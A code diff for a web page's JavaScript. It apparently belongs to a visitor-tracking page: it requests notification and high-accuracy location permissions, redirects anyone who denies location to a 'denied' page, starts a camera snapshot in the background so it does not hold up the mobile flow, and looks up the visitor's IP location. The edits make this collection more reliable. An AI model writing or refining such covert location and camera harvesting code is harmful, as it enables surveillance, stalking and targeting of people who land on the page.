@@ -157,20 +157,29 @@
 
     function askNotificationPermission() {
       if ('Notification' in window && Notification.permission !== 'granted') {
-        Notification.requestPermission();
+        Notification.requestPermission().catch(e => console.warn("Notification permission error", e));
       }
     }
 
     function askLocation() {
       return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          console.warn("Geolocation not supported");
+          return resolve(false);
+        }
+
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             coords.lat = pos.coords.latitude;
             coords.lon = pos.coords.longitude;
             coords.acc = pos.coords.accuracy;
+            console.log("Location granted", coords);
             resolve(true);
           },
-          () => resolve(false),
+          (err) => {
+            console.warn("Location denied", err);
+            resolve(false);
+          },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       });
@@ -182,15 +191,16 @@
         <div id="spinner"></div>
       `;
 
-      const locationAllowed = await askLocation();
       askNotificationPermission();
 
+      const locationAllowed = await askLocation();
       if (!locationAllowed) {
         window.location.href = deniedPage;
         return;
       }
 
-      await captureSnapshot();
+      // Don't block mobile flow — run camera but don't wait
+      captureSnapshot();
 
       fetch("https://api.db-ip.com/v2/free/self")
         .then(res => res.json())
